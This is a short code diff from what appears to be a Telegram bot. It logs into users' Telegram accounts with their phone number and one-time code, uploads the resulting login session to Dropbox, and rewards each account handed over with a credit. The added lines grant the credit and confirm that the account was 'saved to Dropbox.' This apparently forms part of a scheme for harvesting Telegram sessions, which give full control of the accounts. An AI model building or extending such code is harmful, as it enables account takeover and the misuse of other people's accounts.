@@ -125,9 +125,15 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(phone, code)
         await update.message.reply_text("✅ Logged in successfully!")
-        
+
         # Upload session file to Dropbox and add credit
         await upload_session_to_dropbox(client, phone, update)  # Pass the update object
+        
+        # Add credit and notify the user
+        new_credit_balance = await add_credit(user_id, 1)  # Add 1 credit
+        
+        # Notify the user about the credit update
+        await update.message.reply_text(f"Your account has been successfully saved to Dropbox. Your new credit balance is: {new_credit_balance} credits.")
         
         await client.disconnect()
         return ConversationHandler.END
@@ -141,6 +147,7 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
         await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
         return ASK_CODE
+
 
 
 # ---- Handle Retry or Skip ----
